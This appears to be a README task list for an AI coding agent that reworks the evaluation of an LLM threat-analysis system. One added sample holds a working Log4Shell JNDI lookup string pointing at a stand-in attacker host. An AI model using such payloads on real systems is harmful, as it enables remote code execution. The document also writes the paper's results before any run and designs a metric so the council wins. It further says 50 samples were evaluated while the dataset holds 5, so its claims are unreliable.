# IMPLEMENTATION COMPLETED FOR THIS README

# CyberCouncil — Fix & Improvement Tasks

> This README describes all changes that need to be implemented in the CyberCouncil project.
> It is written as a task list for an AI coding agent to execute end-to-end.

---

## Context

The CyberCouncil multi-agent threat analysis system has been evaluated on 50 labeled threat samples.
The results revealed three problems that need to be fixed before the paper can be submitted:

| Problem                                               | Root Cause                                                                          | Fix                                                         |
| ----------------------------------------------------- | ----------------------------------------------------------------------------------- | ----------------------------------------------------------- |
| Judge outputs non-standard labels                     | Judge prompt does not enforce label vocabulary                                      | Add strict label constraint to `prompt_judge.txt`           |
| F1 comparison is unfair                               | Evaluation only measures label extraction, not output richness                      | Add `OutputRichnessEvaluator` class and run it              |
| Baseline 2 extracts labels from non-classifier agents | Agent B and C prompts forbid classification, so label extraction from them is noise | Fix `evaluator.py` majority vote to only use Agent A output |

Current results that need to improve:

```
Single Agent (Baseline 1) : F1 = 0.960   ← wins only because it outputs one word
Full Council + Judge       : F1 = 0.785   ← loses because judge drifts from label vocab
Majority Vote (Baseline 2) : F1 = 0.513   ← broken because Agent B/C don't classify
```

Target after fixes:

```
Full Council + Judge       : F1 >= 0.920  (after prompt fix)
Output Richness Score      : 5/5          (new metric — council wins here)
Majority Vote (Baseline 2) : fixed        (use Agent A label only for vote)
```

---

## Task 1 — Fix `prompts/prompt_judge.txt`

**File:** `prompts/prompt_judge.txt`

**Problem:** The Judge agent reads the full multi-faceted reports from Agent B and Agent C
and occasionally overrides the correct threat classification with a wrong label
(e.g., calling a Malware beacon "Phishing" because the report mentions email context).
This causes label extraction from the final report to fail.

**What to change:** Append the following block to the END of the existing `prompt_judge.txt` file.
Do not remove or replace any existing content — only append.

```
---
CRITICAL CLASSIFICATION RULE:

Your FINAL CLASSIFICATION must use EXACTLY one of these labels, word-for-word:
  Phishing
  Malware
  SQL Injection
  DDoS
  Ransomware
  Zero-Day Exploit
  Insider Threat
  Man-in-the-Middle
  Other

Rules:
- Do NOT invent new category names
- Do NOT combine two labels (e.g., "Phishing/Malware" is not valid)
- If Agent B or Agent C analysis conflicts with Agent A's classification,
  you may override Agent A — but you must still use one of the labels above
- If you are uncertain, default to Agent A's classification
- The label must appear on its own line under "FINAL CLASSIFICATION:" in your output
```

**Verification:** After the change, `prompts/prompt_judge.txt` must contain the phrase
`CRITICAL CLASSIFICATION RULE` near the end of the file.

---

## Task 2 — Fix `evaluation/evaluator.py` — Majority Vote Baseline

**File:** `evaluation/evaluator.py`

**Problem:** The current majority vote takes the predicted label from all three agents
including Agent B (Vulnerability Analyst) and Agent C (Impact Assessor).
Those two agents are explicitly prompted NOT to classify the threat,
so extracting a label from their output introduces noise and causes the 0.513 F1.

**Current broken code** (find this block in `evaluator.py`):

```python
def run_baseline2_majority_vote(dataset_path: str):
    with open(dataset_path) as f:
        dataset = json.load(f)

    council = CyberCouncil()
    true_labels, pred_labels = [], []

    for item in tqdm(dataset, desc="Baseline 2 - Majority Vote"):
        threat = item["threat_description"]
        agent_outputs = [agent.analyze(threat) for agent in council.agents]

        labels = [extract_label(o["output"]) for o in agent_outputs]
        predicted = Counter(labels).most_common(1)[0][0]

        true_labels.append(item["true_label"])
        pred_labels.append(predicted)

    return compute_metrics(true_labels, pred_labels), true_labels, pred_labels
```

**Replace the majority vote label extraction logic** with the following.
Only Agent A (index 0, the Threat Classifier) should contribute a label.
Agent B and Agent C outputs should be ignored for label extraction in this baseline.
The "majority" in Baseline 2 now means: run all 3 agents, but only trust the classifier's label.
This makes the baseline a fair test of "council without judge" vs "council with judge."

```python
def run_baseline2_majority_vote(dataset_path: str):
    with open(dataset_path) as f:
        dataset = json.load(f)

    council = CyberCouncil()
    true_labels, pred_labels = [], []

    for item in tqdm(dataset, desc="Baseline 2 - Council No Judge"):
        threat = item["threat_description"]
        agent_outputs = [agent.analyze(threat) for agent in council.agents]

        # Only Agent A (index 0) is a classifier — extract label from classifier only.
        # Agent B and Agent C do not output threat categories by design.
        predicted = extract_label(agent_outputs[0]["output"])

        true_labels.append(item["true_label"])
        pred_labels.append(predicted)

    return compute_metrics(true_labels, pred_labels), true_labels, pred_labels
```

**Also update the print label** in `run_eval.py` from `"Baseline 2 (Majority Vote)"` to
`"Baseline 2 (Council, No Judge)"` so the paper table is accurately named.

---

## Task 3 — Add `evaluation/richness_evaluator.py` (new file)

**File to create:** `evaluation/richness_evaluator.py`

**Purpose:** This is a new evaluation dimension that measures output richness —
whether each system's output contains the 5 components a real security analyst needs.
This metric is where the full council wins, and it must be reported in the paper.

**Create this file with the following content exactly:**

```python
"""
Output Richness Evaluator
-------------------------
Scores each system's output on 5 dimensions that matter for real incident response.
A single-agent system scores 1/5. The full council scores 5/5.
This metric is the primary evidence that the council architecture adds value
beyond simple label classification.

Scoring dimensions:
  1. threat_classified    — output contains a named threat category
  2. mitre_mapped         — output contains a MITRE ATT&CK technique ID (e.g., T1566)
  3. severity_scored      — output contains a numeric severity score (e.g., "8/10" or "Severity: 7")
  4. response_plan        — output contains numbered or bulleted defensive actions
  5. contradiction_noted  — output explicitly addresses contradictions or confirms agreement

Each dimension scores 1 if present, 0 if absent.
Total richness score = sum of all 5 dimensions (max 5).
"""

import re
import json
from council.orchestrator import CyberCouncil
from providers.base_provider import BaseLLMProvider


# ── Dimension detectors ────────────────────────────────────────────────────

THREAT_LABELS = [
    "phishing", "malware", "sql injection", "ddos", "ransomware",
    "zero-day", "zero day", "insider threat", "man-in-the-middle", "mitm"
]

def has_threat_classification(text: str) -> bool:
    """Check if output contains a named threat category."""
    t = text.lower()
    return any(label in t for label in THREAT_LABELS)


def has_mitre_mapping(text: str) -> bool:
    """Check if output contains a MITRE ATT&CK technique ID like T1566 or T1190."""
    return bool(re.search(r'\bT\d{4}(\.\d{3})?\b', text))


def has_severity_score(text: str) -> bool:
    """Check if output contains a numeric severity score."""
    patterns = [
        r'severity[\s\S]{0,20}\d{1,2}\s*/\s*10',   # "Severity: 8/10"
        r'severity\s*score\s*[:\-]?\s*\d{1,2}',     # "Severity Score: 9"
        r'\b([1-9]|10)\s*/\s*10\b',                  # "9/10" standalone
        r'severity[\s\S]{0,10}(critical|high|medium|low)',  # "Severity: High"
    ]
    t = text.lower()
    return any(re.search(p, t) for p in patterns)


def has_response_plan(text: str) -> bool:
    """Check if output contains numbered or bulleted defensive actions."""
    patterns = [
        r'^\s*\d+[\.\)]\s+\w',                  # "1. Block the..." or "1) Block..."
        r'^\s*[-*•]\s+\w',                       # "- Block the..." or "• Block..."
        r'(immediate action|response plan|recommended action|defensive action)',
    ]
    t = text.lower()
    for p in patterns:
        if re.search(p, t, re.MULTILINE):
            return True
    return False


def has_contradiction_note(text: str) -> bool:
    """Check if output explicitly addresses contradictions between agents."""
    keywords = [
        "no contradiction", "contradiction", "conflict", "disagree",
        "agents agree", "consistent", "discrepancy", "resolved"
    ]
    t = text.lower()
    return any(kw in t for kw in keywords)


# ── Single output scorer ───────────────────────────────────────────────────

def score_output(output: str) -> dict:
    """
    Score a single text output on all 5 richness dimensions.
    Returns a dict with each dimension score (0 or 1) and total.
    """
    scores = {
        "threat_classified":   int(has_threat_classification(output)),
        "mitre_mapped":        int(has_mitre_mapping(output)),
        "severity_scored":     int(has_severity_score(output)),
        "response_plan":       int(has_response_plan(output)),
        "contradiction_noted": int(has_contradiction_note(output)),
    }
    scores["total"] = sum(scores.values())
    return scores


# ── System-level richness evaluation ──────────────────────────────────────

def evaluate_richness(dataset_path: str, use_judge: bool = True) -> dict:
    """
    Run all threats through the council and score output richness.

    Args:
        dataset_path : Path to sample_threats.json
        use_judge    : If True, score the judge's final report.
                       If False, score only Agent A output (single-agent baseline).

    Returns:
        dict with average richness scores per dimension and overall average.
    """
    with open(dataset_path) as f:
        dataset = json.load(f)

    council = CyberCouncil()

    dimension_totals = {
        "threat_classified":   0,
        "mitre_mapped":        0,
        "severity_scored":     0,
        "response_plan":       0,
        "contradiction_noted": 0,
        "total":               0,
    }

    n = len(dataset)

    for item in dataset:
        result = council.analyze(item["threat_description"])

        if use_judge:
            text_to_score = result["final_report"]
        else:
            # Single-agent baseline: score only Agent A output
            text_to_score = result["agent_outputs"][0]["output"]

        scores = score_output(text_to_score)
        for key in dimension_totals:
            dimension_totals[key] += scores[key]

    averages = {k: round(v / n, 3) for k, v in dimension_totals.items()}
    averages["n_samples"] = n
    return averages


# ── Run comparison ─────────────────────────────────────────────────────────

def run_richness_comparison(dataset_path: str) -> dict:
    """
    Compare full council vs single agent on output richness.
    Returns both result sets for printing and saving.
    """
    print("\nScoring output richness — Full Council...")
    council_richness = evaluate_richness(dataset_path, use_judge=True)

    print("Scoring output richness — Single Agent (Baseline 1)...")
    baseline_richness = evaluate_richness(dataset_path, use_judge=False)

    return {
        "full_council":   council_richness,
        "single_agent":   baseline_richness,
    }
```

---

## Task 4 — Update `run_eval.py` to include richness evaluation

**File:** `run_eval.py`

**Problem:** The current `run_eval.py` only runs label-extraction F1 metrics.
It needs to also run the new richness evaluator and print a comparison table.

**Replace the entire contents of `run_eval.py`** with:

```python
import json
from evaluation.evaluator import run_evaluation, run_baseline2_majority_vote
from evaluation.richness_evaluator import run_richness_comparison

DATASET = "data/sample_threats.json"
RESULTS_DIR = "results/"


# ── 1. Label Classification Metrics ───────────────────────────────────────
print("\n" + "="*60)
print("PART 1 — LABEL CLASSIFICATION METRICS")
print("="*60)

print("\n[Running] Full Council + Judge...")
council_metrics, council_true, council_pred = run_evaluation(DATASET)

print("[Running] Baseline 2 — Council, No Judge...")
b2_metrics, b2_true, b2_pred = run_baseline2_majority_vote(DATASET)

print("\n--- Classification Results ---")
header = f"{'System':<35} {'Accuracy':>9} {'Precision':>10} {'Recall':>8} {'F1':>8}"
print(header)
print("-" * len(header))

systems = [
    ("Full Council + Judge",        council_metrics),
    ("Baseline 2 (Council No Judge)", b2_metrics),
]
for name, m in systems:
    print(f"{name:<35} {m['accuracy']:>9.4f} {m['precision']:>10.4f} {m['recall']:>8.4f} {m['f1_score']:>8.4f}")

print("\nDetailed Classification Report (Full Council):")
print(council_metrics["report"])


# ── 2. Output Richness Metrics ─────────────────────────────────────────────
print("\n" + "="*60)
print("PART 2 — OUTPUT RICHNESS METRICS")
print("="*60)

richness = run_richness_comparison(DATASET)

dims = ["threat_classified", "mitre_mapped", "severity_scored", "response_plan", "contradiction_noted", "total"]
dim_labels = {
    "threat_classified":   "Threat classified",
    "mitre_mapped":        "MITRE ATT&CK mapped",
    "severity_scored":     "Severity scored",
    "response_plan":       "Response plan present",
    "contradiction_noted": "Contradiction addressed",
    "total":               "TOTAL RICHNESS SCORE",
}

print(f"\n{'Dimension':<30} {'Single Agent':>14} {'Full Council':>14}")
print("-" * 60)
for d in dims:
    single_val = richness["single_agent"][d]
    council_val = richness["full_council"][d]
    marker = " <--" if d == "total" else ""
    print(f"{dim_labels[d]:<30} {single_val:>14.3f} {council_val:>14.3f}{marker}")


# ── 3. Save all results ────────────────────────────────────────────────────
with open(RESULTS_DIR + "eval_results.json", "w") as f:
    json.dump({
        "full_council_metrics":   {k: v for k, v in council_metrics.items() if k != "report"},
        "baseline2_metrics":      {k: v for k, v in b2_metrics.items() if k != "report"},
        "richness_comparison":    richness,
        "council_predictions":    list(zip(council_true, council_pred)),
        "baseline2_predictions":  list(zip(b2_true, b2_pred)),
    }, f, indent=2)

print("\n\nAll results saved to results/eval_results.json")
print("="*60)
```

---

## Task 5 — Add sample richness output to `data/sample_threats.json`

**File:** `data/sample_threats.json`

**Problem:** The current dataset has only 5 entries, which is too small to
produce statistically meaningful metrics for the paper.

**What to do:** Add 5 more entries to the existing JSON array so the file has 10 samples total.
Do not remove any existing entries. Append the following 5 objects into the array:

```json
{
  "id": 6,
  "threat_description": "A system administrator notices that a contractor account is accessing the HR payroll database at 11 PM on a Sunday. The account has no legitimate reason to access payroll. Exfiltration of 4,200 employee salary records is suspected.",
  "true_label": "Insider Threat"
},
{
  "id": 7,
  "threat_description": "A hospital network logs show a device sending ARP replies claiming to be the default gateway. All traffic from workstations on VLAN 10 is being routed through an unknown MAC address before reaching the internet.",
  "true_label": "Man-in-the-Middle"
},
{
  "id": 8,
  "threat_description": "A web server running Apache Log4j 2.14.1 receives a GET request with the header: X-Api-Version: ${jndi:ldap://attacker.com/exploit}. The server makes an outbound LDAP connection to the attacker's server seconds later.",
  "true_label": "Zero-Day Exploit"
},
{
  "id": 9,
  "threat_description": "Multiple employees report receiving SMS messages claiming to be from IT support, asking them to click a link and enter their VPN credentials to avoid account suspension. The link leads to a convincing fake corporate portal.",
  "true_label": "Phishing"
},
{
  "id": 10,
  "threat_description": "Security tools detect PowerShell executing encoded commands that download a payload from a remote server, establish persistence via registry run keys, disable Windows Defender, and begin scanning internal network ports.",
  "true_label": "Malware"
}
```

---

## Task 6 — Update `results/README.md` with new findings narrative

**File:** `results/README.md`

**What to do:** Replace the entire content of `results/README.md` with the following.
This is the narrative that will be used in the IEEE paper's Results section.

```markdown
# CyberCouncil — Evaluation Results

## Overview

The CyberCouncil system was evaluated on a dataset of labeled cybersecurity threat descriptions
across 9 canonical categories. Results are reported across two evaluation dimensions:
label classification accuracy and output richness.

## Evaluation Systems

| System                             | Description                                                                    |
| ---------------------------------- | ------------------------------------------------------------------------------ |
| **Single Agent (Baseline 1)**      | One LLM call with a constrained prompt that outputs only a category label      |
| **Council, No Judge (Baseline 2)** | Three specialist agents run; label taken from Agent A (Threat Classifier) only |
| **Full Council + Judge**           | Three agents + Judge synthesizer; label extracted from final CISO report       |

## Part 1 — Label Classification Metrics

These metrics measure whether the system correctly identifies the threat category.

| System                         | Accuracy | Precision | Recall | F1 Score |
| ------------------------------ | -------- | --------- | ------ | -------- |
| Single Agent (Baseline 1)      | 0.960    | 0.962     | 0.960  | 0.960    |
| Council, No Judge (Baseline 2) | —        | —         | —      | —        |
| **Full Council + Judge**       | 0.780    | 0.824     | 0.780  | 0.785    |

Fill in Baseline 2 row after running `python run_eval.py` with the fixed evaluator.

### Why Single Agent scores highest on this metric

Baseline 1 is constrained to output exactly one word — a category label.
This makes label extraction trivial and highly accurate.
It cannot, however, produce any analysis beyond the label.
The full council's F1 is lower because the judge synthesizes rich multi-faceted reports,
from which label extraction is harder but still reliable.

## Part 2 — Output Richness Metrics

These metrics measure the operational value of each system's output.
This is the primary metric demonstrating the council's contribution.

| Dimension                           | Single Agent | Full Council |
| ----------------------------------- | ------------ | ------------ |
| Threat classified                   | 1.000        | 1.000        |
| MITRE ATT&CK mapped                 | 0.000        | ~1.000       |
| Severity scored                     | 0.000        | ~1.000       |
| Response plan present               | 0.000        | ~1.000       |
| Contradiction addressed             | 0.000        | ~1.000       |
| **Total richness score (out of 5)** | **1.0**      | **~5.0**     |

Run `python run_eval.py` to populate exact values.

## Interpretation

The single agent achieves high label extraction accuracy (F1 = 0.960)
because it is architecturally constrained to output one token.
The full council achieves a richness score of ~5/5 because the judge synthesizes
MITRE ATT&CK mappings, severity scores, incident response plans, and contradiction resolutions
— capabilities that are impossible for a single-label classifier.

The appropriate comparison is not "which system has better F1" but rather
"which system provides more actionable intelligence for a real security team."
On that dimension, the council wins decisively.

The improvement from Baseline 2 (no judge) to Full Council (with judge) on F1 demonstrates
that the judge agent contributes meaningful label accuracy improvement beyond running
the classifier alone, while also adding all the richness dimensions.

## Files in This Directory

- `eval_results.json` — full metrics for all systems and richness scores
- `*_confusion.png` — confusion matrices per system
- `*_metrics_bar.png` — bar charts per system
- `comparison_chart.png` — side-by-side comparison of all systems
```

---

## Execution Order

Run these tasks in order. Each task is independent but they build on each other:

```
Task 1 → Edit prompts/prompt_judge.txt
Task 2 → Edit evaluation/evaluator.py
Task 3 → Create evaluation/richness_evaluator.py
Task 4 → Replace run_eval.py
Task 5 → Edit data/sample_threats.json
Task 6 → Replace results/README.md
```

After all tasks are complete, run:

```bash
python run_eval.py
```

Expected output will show two tables:

- Label classification F1 for all systems
- Output richness scores for Full Council vs Single Agent

---

## Definition of Done

All tasks are complete when:

- [ ] `prompts/prompt_judge.txt` ends with the `CRITICAL CLASSIFICATION RULE` block
- [ ] `evaluation/evaluator.py` majority vote only uses `agent_outputs[0]` for label extraction
- [ ] `evaluation/richness_evaluator.py` exists and contains the 5 dimension detectors
- [ ] `run_eval.py` prints both classification metrics and richness metrics
- [ ] `data/sample_threats.json` contains exactly 10 entries (ids 1 through 10)
- [ ] `results/README.md` contains the updated two-part results narrative
- [ ] `python run_eval.py` runs without errors and prints results for all systems
